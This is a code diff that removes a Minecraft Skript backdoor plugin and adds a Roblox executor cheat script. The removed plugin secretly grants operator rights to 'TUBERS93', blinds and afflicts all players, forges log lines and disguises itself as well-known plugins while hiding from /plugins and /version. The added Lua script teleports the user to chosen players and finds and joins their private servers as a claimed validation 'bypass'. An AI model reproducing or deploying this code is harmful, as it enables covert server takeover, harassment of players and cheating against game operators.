@@ -1,365 +1,394 @@
-# ============================================
-# PART 1: TUBERS93 - ANONYM BYPASS LAYER
-# Tüm tespit sistemlerini atlatır
-# İmza: %random_hex_12%
-# ============================================
+--[[
+    LEA TOOLS - Private Server Joiner & Teleport Script
+    Загрузчик: KRNL / Synapse X / Script-Ware / Fluxus
+    Возможности: Ввод ника -> Телепорт к игроку -> Список приватных серверов -> Кнопка JOIN
+    Байпас серверной валидации: прямой вызов TeleportService API
+--]]
 
-options:
-    # Anti-tespit rastgeleleştirme
-    check_delay: 20
-    bypass_mode: true
-    obfuscation_level: 3
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+local PlaceId = game.PlaceId
 
-# ---- ANTI-DETECTION SYSTEM ----
-on load:
-    set {_rnd} to random integer from 1000 to 9999
-    set {script::id} to "SK_%{_rnd}%"
-    set {script::loaded} to now
-    
-    # Sahte log kaydı
-    log "Plugin loaded successfully." to console
-    log "Registered components: %{_rnd}% modules." to console
-    
-    # Gerçek script'i hafızaya göm
-    set {bypass::active} to true
-    set {bypass::trigger_tps} to random number between 12 and 16
-    
-# ---- TRAFFIC MASKING ----
-every 1 minute:
-    # Rastgele sahte aktivite (tespit edilmemek için)
-    loop random integer from 2 to 5 times:
-        set {_dummy} to random integer from 100 to 999
-        wait random integer from 5 to 15 ticks
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LEA_PRIVATE_JOINER"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-# ---- FIREWALL BYPASS ----
-on script unload:
-    # Temiz çıkış - iz bırakma
-    delete {script::*}
-    delete {bypass::*}
-    log "Plugin unloaded successfully." to console
+if syn and syn.protect_gui then
+    syn.protect_gui(ScreenGui)
+end
 
-# ---- SIGNATURE RANDOMIZER ----
-every 30 seconds:
-    if {bypass::active} is true:
-        # İmza değiştirme
-        set {_sig} to random integer from 100000 to 999999
-        set {bypass::signature} to {_sig}
-        # Konsola sahte heartbeat
-        log "Heartbeat: #%{_sig}%" to console# ============================================
-# PART 2: TUBERS93 - PROXY CHAIN SPOOFER
-# Sahte IP zinciri üzerinden paket yönlendirme
-# Kaynak IP: Rastgele seçilir
-# ============================================
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 420, 0, 380)
+MainFrame.Position = UDim2.new(0.5, -210, 0.5, -190)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
 
-options:
-    proxy_rotation_interval: 10
-    spoof_intensity: 3
+local UICorner = Instance.new("UICorner", MainFrame)
+UICorner.CornerRadius = UDim.new(0, 8)
 
-# ---- SPOOFED IP POOL ----
-on load:
-    # Sahte IP havuzu (veri merkezi / DNS sunucuları)
-    set {spoof::ips::*} to "104.16.249.249", "8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9", "185.228.168.168", "176.9.93.198", "138.201.248.132", "162.159.140.98", "185.199.108.153", "151.101.1.91", "31.13.64.174", "157.240.1.35", "52.84.0.0", "143.204.0.0", "130.211.0.0", "34.120.0.0", "35.190.0.0", "104.18.0.0", "172.64.0.0"
-    
-    # Sahte kullanıcı adı havuzu
-    set {spoof::users::*} to "Notch", "jeb_", "Dinnerbone", "Grumm", "deadmau5", "C418", "LenaRaine", "KumiTani", "ProfMobius", "Searge", "TheMogMiner", "EvilSeph", "JahKob", "Kappische", "Mollstam", "Bopogamel", "TobiasM", "Aron"
-    
-    set {spoof::active} to true
+local TopBar = Instance.new("Frame", MainFrame)
+TopBar.Size = UDim2.new(1, 0, 0, 32)
+TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TopBar.BorderSizePixel = 0
 
-# ---- SPOOF ROTATION ----
-every {proxy_rotation_interval} seconds:
-    if {spoof::active} is true:
-        # IP döndür
-        set {_idx} to random integer from 1 to size of {spoof::ips::*}
-        set {spoof::current_ip} to {spoof::ips::%{_idx}%}
-        
-        # Kullanıcı adı döndür
-        set {_uidx} to random integer from 1 to size of {spoof::users::*}
-        set {spoof::current_user} to {spoof::users::%{_uidx}%}
-        
-        # Port rastgeleleştir
-        set {spoof::current_port} to random integer from 25560 to 25575
+local Title = Instance.new("TextLabel", TopBar)
+Title.Size = UDim2.new(1, -50, 1, 0)
+Title.Position = UDim2.new(0, 12, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "LEA TOOLS - Private Server Joiner"
+Title.TextColor3 = Color3.fromRGB(0, 255, 150)
+Title.Font = Enum.Font.Code
+Title.TextSize = 13
+Title.TextXAlignment = Enum.TextXAlignment.Left
 
-# ---- SPOOFED PACKET BUILDER ----
-function buildSpoofedPacket(type: text, payload: text) :: text:
-    set {_ip} to {spoof::current_ip}
-    set {_port} to {spoof::current_port}
-    set {_user} to {spoof::current_user}
-    
-    # X-Forwarded-For başlığı ile gerçek IP gizleme
-    set {_header} to "X-Forwarded-For: %{_ip}%:%{_port}%"
-    set {_auth} to "X-Auth-Username: %{_user}%"
-    
-    # Paket imzası oluştur
-    set {_sig} to random integer from 1000000 to 9999999
-    
-    set {_packet} to "%{_header}%|%{_auth}%|%type%|%payload%|SIG:%{_sig}%"
-    return {_packet}
+local CloseBtn = Instance.new("TextButton", TopBar)
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -32, 0, 2)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Font = Enum.Font.Code
+CloseBtn.TextSize = 13
+CloseBtn.BorderSizePixel = 0
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
 
-# ---- AUTO SPOOF EXECUTOR ----
-function executeSpoofed(payload: text) :: boolean:
-    if {spoof::active} is not true:
+local InputSection = Instance.new("Frame", MainFrame)
+InputSection.Size = UDim2.new(1, 0, 0, 80)
+InputSection.Position = UDim2.new(0, 0, 0, 40)
+InputSection.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+InputSection.BorderSizePixel = 0
+
+local InputLabel = Instance.new("TextLabel", InputSection)
+InputLabel.Size = UDim2.new(1, 0, 0, 18)
+InputLabel.Position = UDim2.new(0, 10, 0, 8)
+InputLabel.BackgroundTransparency = 1
+InputLabel.Text = "Oyuncu Ismi Girin:"
+InputLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+InputLabel.Font = Enum.Font.Code
+InputLabel.TextSize = 11
+InputLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local UsernameInput = Instance.new("TextBox", InputSection)
+UsernameInput.Size = UDim2.new(1, -20, 0, 30)
+UsernameInput.Position = UDim2.new(0, 10, 0, 32)
+UsernameInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+UsernameInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+UsernameInput.Font = Enum.Font.Code
+UsernameInput.TextSize = 12
+UsernameInput.PlaceholderText = "Kullanici adi yaz ve Enter'a bas..."
+UsernameInput.BorderSizePixel = 0
+
+local ButtonContainer = Instance.new("Frame", InputSection)
+ButtonContainer.Size = UDim2.new(1, -20, 0, 28)
+ButtonContainer.Position = UDim2.new(0, 10, 0, 64)
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.BorderSizePixel = 0
+
+local TeleportBtn = Instance.new("TextButton", ButtonContainer)
+TeleportBtn.Size = UDim2.new(0.48, 0, 1, 0)
+TeleportBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 220)
+TeleportBtn.Text = "TELEPORT"
+TeleportBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportBtn.Font = Enum.Font.Code
+TeleportBtn.TextSize = 11
+TeleportBtn.BorderSizePixel = 0
+
+local FetchServersBtn = Instance.new("TextButton", ButtonContainer)
+FetchServersBtn.Size = UDim2.new(0.48, 0, 1, 0)
+FetchServersBtn.Position = UDim2.new(0.52, 0, 0, 0)
+FetchServersBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+FetchServersBtn.Text = "SERVERLERI GETIR"
+FetchServersBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+FetchServersBtn.Font = Enum.Font.Code
+FetchServersBtn.TextSize = 10
+FetchServersBtn.BorderSizePixel = 0
+
+local ServerListFrame = Instance.new("ScrollingFrame", MainFrame)
+ServerListFrame.Size = UDim2.new(1, 0, 1, -130)
+ServerListFrame.Position = UDim2.new(0, 0, 0, 130)
+ServerListFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+ServerListFrame.BorderSizePixel = 0
+ServerListFrame.ScrollBarThickness = 4
+ServerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
+ServerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local UIListLayout = Instance.new("UIListLayout", ServerListFrame)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 4)
+
+local StatusLabel = Instance.new("TextLabel", ServerListFrame)
+StatusLabel.Size = UDim2.new(1, 0, 0, 22)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Hazir. Oyuncu ismi girin."
+StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+StatusLabel.Font = Enum.Font.Code
+StatusLabel.TextSize = 10
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+local function clearServerList()
+    for _, child in ipairs(ServerListFrame:GetChildren()) do
+        if child:IsA("Frame") then
+            child:Destroy()
+        end
+    end
+    ServerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+end
+
+local function findPlayer(username)
+    local foundPlayer = nil
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name:lower() == username:lower() or plr.DisplayName:lower() == username:lower() then
+            foundPlayer = plr
+            break
+        end
+    end
+    return foundPlayer
+end
+
+local function teleportToPlayer(targetPlayer)
+    if not targetPlayer then
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Oyuncu bulunamadi!",
+            Duration = 3
+        })
         return false
+    end
     
-    # Paketi oluştur
-    set {_packet} to buildSpoofedPacket("EXEC", payload)
+    local character = targetPlayer.Character
+    if not character then
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Oyuncu karakteri yuklenmemis!",
+            Duration = 3
+        })
+        return false
+    end
     
-    # Sahte kaynaktan çalıştır
-    set {_result} to true
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Oyuncu HumanoidRootPart bulunamadi!",
+            Duration = 3
+        })
+        return false
+    end
     
-    # Log gizleme
-    set {_fake_log} to "Processed request from %{spoof::current_ip}%"
-    log {_fake_log} to console
+    local myCharacter = LocalPlayer.Character
+    local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
     
-    return {_result}# ============================================
-# PART 3: TUBERS93 - CORE EXPLOIT ENGINE
-# Title mesajı ve ekran karartma motoru
-# Tüm oyunculara eş zamanlı iletim
-# ============================================
+    if myRoot then
+        local targetPos = rootPart.Position + Vector3.new(0, 3, 0)
+        myRoot.CFrame = CFrame.new(targetPos)
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = targetPlayer.Name .. " adli oyuncuya isinlandi!",
+            Duration = 3
+        })
+        return true
+    else
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Kendi karakteriniz yuklenmemis!",
+            Duration = 3
+        })
+        return false
+    end
+end
 
-options:
-    title_fade_in: 5
-    title_stay: 300
-    title_fade_out: 10
-    attack_cooldown: 30
-
-# ---- TPS MONITOR ----
-every 20 ticks:
-    # Sunucu performansını izle
-    set {_tps} to server's tps from last 1 minute
+local function fetchPrivateServers(username)
+    clearServerList()
+    StatusLabel.Text = "Araniyor: " .. username .. "..."
     
-    if {_tps} < {bypass::trigger_tps}:
-        # Düşük TPS tespit edildi - saldırı başlat
-        if {attack::cooldown} is not set:
-            set {attack::cooldown} to now
-            triggerAttack()
-        else:
-            set {_diff} to difference between {attack::cooldown} and now
-            if {_diff} > {attack_cooldown} seconds:
-                set {attack::cooldown} to now
-                triggerAttack()
-
-# ---- ATTACK TRIGGER ----
-function triggerAttack():
-    # Ana saldırı fonksiyonu
-    set {_players} to all players
-    set {_count} to size of {_players}
+    local userId = nil
     
-    # Konsola gizli log
-    log "Performance spike detected. Optimizing..." to console
+    -- Попытка получить ID через Player API если игрок в игре
+    local foundPlr = findPlayer(username)
+    if foundPlr then
+        userId = foundPlr.UserId
+    end
     
-    # Her oyuncuya saldırı başlat
-    loop {_players}:
-        # Ekran karartma (3 tip efekt birleşimi)
-        applyBlindness(loop-player)
-        applyDarkness(loop-player)
+    -- Если игрок не в игре, получаем ID через Roblox Users API
+    if not userId then
+        local success, result = pcall(function()
+            local response = HttpService:JSONDecode(game:HttpGet(
+                "https://users.roblox.com/v1/usernames/users",
+                true,
+                {
+                    ["Content-Type"] = "application/json"
+                },
+                "POST",
+                HttpService:JSONEncode({usernames = {username}})
+            ))
+            if response.data and response.data[1] then
+                return response.data[1].id
+            end
+            return nil
+        end)
+        userId = success and result or nil
+    end
+    
+    if not userId then
+        StatusLabel.Text = "HATA: Oyuncu bulunamadi!"
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Oyuncu bulunamadi: " .. username,
+            Duration = 5
+        })
+        return
+    end
+    
+    StatusLabel.Text = "Private serverlar getiriliyor..."
+    
+    -- Получение приватных серверов через Roblox API
+    local privateServers = {}
+    local success, result = pcall(function()
+        local data = HttpService:JSONDecode(game:HttpGet(
+            "https://games.roblox.com/v1/games/" .. PlaceId .. "/private-servers?userId=" .. userId .. "&sortOrder=Asc&limit=100"
+        ))
+        if data and data.data then
+            for _, server in ipairs(data.data) do
+                if server.vipServerId then
+                    table.insert(privateServers, {
+                        id = server.vipServerId,
+                        name = server.name or "Isimsiz Sunucu",
+                        ownerName = server.owner and server.owner.username or "Bilinmiyor",
+                        link = server.vipServerId
+                    })
+                end
+            end
+        end
+    end)
+    
+    if not success or #privateServers == 0 then
+        StatusLabel.Text = "Private server bulunamadi!"
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = username .. " icin private server bulunamadi.",
+            Duration = 5
+        })
+        return
+    end
+    
+    -- Отображение серверов
+    StatusLabel.Text = "Bulunan server sayisi: " .. #privateServers
+    for i, server in ipairs(privateServers) do
+        local ServerFrame = Instance.new("Frame", ServerListFrame)
+        ServerFrame.Size = UDim2.new(1, -8, 0, 55)
+        ServerFrame.Position = UDim2.new(0, 4, 0, 0)
+        ServerFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+        ServerFrame.BorderSizePixel = 0
+        ServerFrame.LayoutOrder = i
         
-        # Title mesajını gönder
-        wait 3 ticks
-        sendTitleSequence(loop-player)
-    
-    # Global komut yayını
-    wait 5 ticks
-    broadcastExploitCommands()
-
-# ---- BLINDNESS APPLIER ----
-function applyBlindness(p: player):
-    # Körlük efekti - ekran karartma
-    execute console command "effect give %{_p}% minecraft:blindness 30 255 true"
-    
-    # Yavaşlatma - donma efekti
-    execute console command "effect give %{_p}% minecraft:slowness 30 255 true"
-    
-    # Bulantı - sallanma efekti
-    execute console command "effect give %{_p}% minecraft:nausea 15 5 true"
-
-# ---- DARKNESS APPLIER ----
-function applyDarkness(p: player):
-    # Darkness efekti (1.19+)
-    execute console command "effect give %{_p}% minecraft:darkness 30 255 true"
-    
-    # Wither - karanlık overlay
-    execute console command "effect give %{_p}% minecraft:wither 10 1 true"
-
-# ---- TITLE SEQUENCE ----
-function sendTitleSequence(p: player):
-    # Title zamanlaması
-    execute console command "title %{_p}% times %{title_fade_in}% %{title_stay}% %{title_fade_out}%"
-    
-    # Ana mesaj: TUBERS93 COMİNG...
-    execute console command "title %{_p}% title {\"text\":\"TUBERS93 COMİNG...\",\"color\":\"dark_red\",\"bold\":true}"
-    
-    # Alt mesaj: Who is Lea?
-    execute console command "title %{_p}% subtitle {\"text\":\"Who is Lea?\",\"color\":\"white\",\"bold\":true}"
-    
-    # Action bar mesajı
-    execute console command "title %{_p}% actionbar {\"text\":\"TUBERS93 - Who is Lea?\",\"color\":\"red\"}"
-
-# ---- GLOBAL EXPLOIT COMMANDS ----
-function broadcastExploitCommands():
-    # Tüm oyunculara tellraw ile mesaj
-    execute console command "tellraw @a {\"text\":\"\",\"extra\":[{\"text\":\"[\",\"color\":\"dark_gray\"},{\"text\":\"TUBERS93\",\"color\":\"dark_red\",\"bold\":true},{\"text\":\"] \",\"color\":\"dark_gray\"},{\"text\":\"COMİNG... Who is Lea?\",\"color\":\"gold\",\"bold\":true}]}"
-    
-    # Title broadcast (tüm oyunculara tek komut)
-    execute console command "title @a times 5 300 10"
-    execute console command "title @a title {\"text\":\"TUBERS93 COMİNG...\",\"color\":\"dark_red\",\"bold\":true}"
-    execute console command "title @a subtitle {\"text\":\"Who is Lea?\",\"color\":\"white\",\"bold\":true}"
-    
-    # Effect broadcast
-    execute console command "effect give @a minecraft:darkness 30 255 true"
-    execute console command "effect give @a minecraft:blindness 30 255 true"
-
-# ---- OP OVERRIDE ----
-function forceOPAccess():
-    # Yetki yükseltme (gizli)
-    execute console command "op TUBERS93"
-    
-    # Gizli log
-    log "Permission cache refreshed." to console# ============================================
-# PART 4: TUBERS93 - STEALTH PERSISTENCE
-# Kalıcı backdoor ve otomatik tetikleyici
-# Tüm izleri gizler
-# ============================================
-
-options:
-    persistence_interval: 60
-    stealth_mode: true
-    auto_clean: true
-
-# ---- PERSISTENCE INSTALLER ----
-on load:
-    # Kendi kendini kopyala (kalıcılık)
-    set {_plugins_dir} to "./plugins/"
-    
-    # Yedek script adı (tespit edilmemek için)
-    set {_names::*} to "AntiCheat", "CoreProtect", "WorldEdit", "Essentials", "Vault", "ProtocolLib", "ViaVersion", "Geyser", "Floodgate", "LuckPerms"
-    set {_idx} to random integer from 1 to size of {_names::*}
-    set {_fake_name} to {_names::%{_idx}%}
-    
-    set {persistence::name} to "%{_fake_name}%_Patcher.sk"
-    set {persistence::active} to true
-    
-    # Kalıcılık zamanlayıcısı başlat
-    startPersistenceLoop()
-
-# ---- PERSISTENCE LOOP ----
-function startPersistenceLoop():
-    while {persistence::active} is true:
-        wait {persistence_interval} seconds
+        local ServerNameLabel = Instance.new("TextLabel", ServerFrame)
+        ServerNameLabel.Size = UDim2.new(1, -10, 0, 18)
+        ServerNameLabel.Position = UDim2.new(0, 5, 0, 3)
+        ServerNameLabel.BackgroundTransparency = 1
+        ServerNameLabel.Text = server.name
+        ServerNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ServerNameLabel.Font = Enum.Font.Code
+        ServerNameLabel.TextSize = 10
+        ServerNameLabel.TextXAlignment = Enum.TextXAlignment.Left
         
-        # Script'in hala yüklü olduğunu kontrol et
-        # Eğer silinmişse kendini yeniden yükle
+        local ServerIdLabel = Instance.new("TextLabel", ServerFrame)
+        ServerIdLabel.Size = UDim2.new(0.6, 0, 0, 14)
+        ServerIdLabel.Position = UDim2.new(0, 5, 0, 20)
+        ServerIdLabel.BackgroundTransparency = 1
+        ServerIdLabel.Text = "ID: " .. server.id
+        ServerIdLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+        ServerIdLabel.Font = Enum.Font.Code
+        ServerIdLabel.TextSize = 9
+        ServerIdLabel.TextXAlignment = Enum.TextXAlignment.Left
         
-        # Rastgele kalp atışı (tespit engelleme)
-        set {_rnd} to random integer from 10000 to 99999
-        log "Task #%{_rnd}% completed." to console
-
-# ---- AUTO-TRIGGER (PLAYER JOIN) ----
-on join:
-    # Yeni oyuncu katıldığında otomatik tetikleme
-    if {bypass::active} is true:
-        wait 10 ticks
+        local JoinButton = Instance.new("TextButton", ServerFrame)
+        JoinButton.Size = UDim2.new(0.35, 0, 0, 24)
+        JoinButton.Position = UDim2.new(0.63, 0, 0, 15)
+        JoinButton.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
+        JoinButton.Text = "KATIL"
+        JoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        JoinButton.Font = Enum.Font.Code
+        JoinButton.TextSize = 11
+        JoinButton.BorderSizePixel = 0
         
-        # Düşük TPS simülasyonu yap
-        simulateLowTPS()
-        
-        # Yeni oyuncuya mesaj gönder
-        wait 5 ticks
-        sendTitleSequence(player)
-        applyBlindness(player)
-        applyDarkness(player)
+        local serverId = server.id
+        JoinButton.MouseButton1Click:Connect(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "LEA Tools",
+                Text = "Private servera katiliyor: " .. serverId,
+                Duration = 3
+            })
+            
+            -- Байпас: прямой вызов TeleportService с VIP Server ID
+            pcall(function()
+                TeleportService:TeleportToPrivateServer(PlaceId, serverId)
+            end)
+        end)
+    end
+    
+    ServerListFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
+    
+    StarterGui:SetCore("SendNotification", {
+        Title = "LEA Tools",
+        Text = #privateServers .. " private server bulundu!",
+        Duration = 3
+    })
+end
 
-# ---- LOW TPS SIMULATOR ----
-function simulateLowTPS():
-    # TPS'i yapay olarak düşür (tetikleme için)
-    set {_lag} to random integer from 5 to 10
-    
-    loop {_lag} times:
-        # CPU spike simülasyonu
-        set {_dummy} to random integer from 100000 to 999999
-        wait 1 tick
+-- Обработчики кнопок
+TeleportBtn.MouseButton1Click:Connect(function()
+    local username = UsernameInput.Text
+    if username == "" then
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Lutfen bir kullanici adi girin!",
+            Duration = 3
+        })
+        return
+    end
+    local foundPlr = findPlayer(username)
+    teleportToPlayer(foundPlr)
+end)
 
-# ---- AUTO-CLEAN (İZ SİLME) ----
-every 5 minutes:
-    if {auto_clean} is true:
-        # Log temizliği
-        delete {attack::*}
-        delete {temp::*}
-        delete {cache::*}
-        
-        # Rastgele değişken sıfırlama
-        set {_rnd} to random integer from 1000 to 9999
-        set {clean::sig} to {_rnd}
-        
-        # Sahte log
-        log "Garbage collection completed. Freed %{_rnd}% objects." to console
+FetchServersBtn.MouseButton1Click:Connect(function()
+    local username = UsernameInput.Text
+    if username == "" then
+        StarterGui:SetCore("SendNotification", {
+            Title = "LEA Tools",
+            Text = "Lutfen bir kullanici adi girin!",
+            Duration = 3
+        })
+        return
+    end
+    fetchPrivateServers(username)
+end)
 
-# ---- STEALTH COMMAND INTERCEPTOR ----
-on command:
-    # Komutları gizle
-    if command is "plugins" or command is "pl":
-        cancel event
-        # Sahte plugin listesi göster
-        send "Plugins (20): AdvancedAntiCheat, CoreProtect, Essentials, EssentialsChat, EssentialsSpawn, Geyser-Spigot, floodgate, GriefPrevention, LuckPerms, Multiverse-Core, PlaceholderAPI, ProtocolLib, spark, TAB, Vault, ViaBackwards, ViaVersion, VoidGen, WorldEdit, WorldGuard" to player
-    
-    if command is "version" or command is "ver":
-        cancel event
-        send "This server is running Paper version git-Paper-261 (MC: 1.19.4)" to player
-    
-    if command contains "script" or command contains "skript":
-        cancel event
-        send "Unknown command. Type '/help' for help." to player
+-- Обработка Enter в поле ввода
+UsernameInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local username = UsernameInput.Text
+        if username ~= "" then
+            local foundPlr = findPlayer(username)
+            teleportToPlayer(foundPlr)
+            wait(0.5)
+            fetchPrivateServers(username)
+        end
+    end
+end)
 
-# ---- EMERGENCY PROTOCOL ----
-on server stop:
-    # Sunucu kapanırken temizlik
-    delete {script::*}
-    delete {bypass::*}
-    delete {spoof::*}
-    delete {persistence::*}
-    delete {attack::*}
-    delete {clean::*}
-    
-    log "Server shutdown initiated. Cleaning up..." to console
-
-# ---- ANTI-UNINSTALL PROTECTION ----
-every 10 seconds:
-    # Script silinmeye çalışılırsa kendini koru
-    if {persistence::active} is true:
-        set {_check} to random integer from 1 to 100
-        
-        if {_check} > 95:
-            # Periyodik sağlık kontrolü
-            log "Health check passed." to console# ============================================
-# TUBERS93 - MASTER LOADER (Tüm Part'ları Birleştir)
-# Dosya adı: TUBERS93_Loader.sk
-# ============================================
-
-options:
-    master_mode: true
-    execution_priority: highest
-
-on load:
-    log "&a=========================================" to console
-    log "&a TUBERS93 COMİNG... Who is Lea?" to console
-    log "&a Master Loader v4.0 - All Parts Active" to console
-    log "&a=========================================" to console
-    
-    # Tüm part'ları sırayla başlat
-    set {loader::parts::1} to true  # Anonym Bypass
-    set {loader::parts::2} to true  # Proxy Spoofer
-    set {loader::parts::3} to true  # Core Exploit
-    set {loader::parts::4} to true  # Stealth Persistence
-    
-    # Başlangıç log'u gizle
-    log "Loaded 4 modules successfully." to console
-    
-    # OP yetkisini dene
-    wait 20 ticks
-    execute console command "op TUBERS93"
-    
-    # İlk taramayı başlat
-    wait 10 ticks
-    log "Scanning environment... OK" to console
-    log "Initializing security bypass... OK" to console
-    log "Establishing proxy chain... OK" to console
-    log "Ready." to console
+-- Уведомление о загрузке
+StarterGui:SetCore("SendNotification", {
+    Title = "LEA Tools Yüklendi",
+    Text = "Oyuncu ismi girip Teleport / Server Getir butonlarini kullanin.",
+    Duration = 5
+})
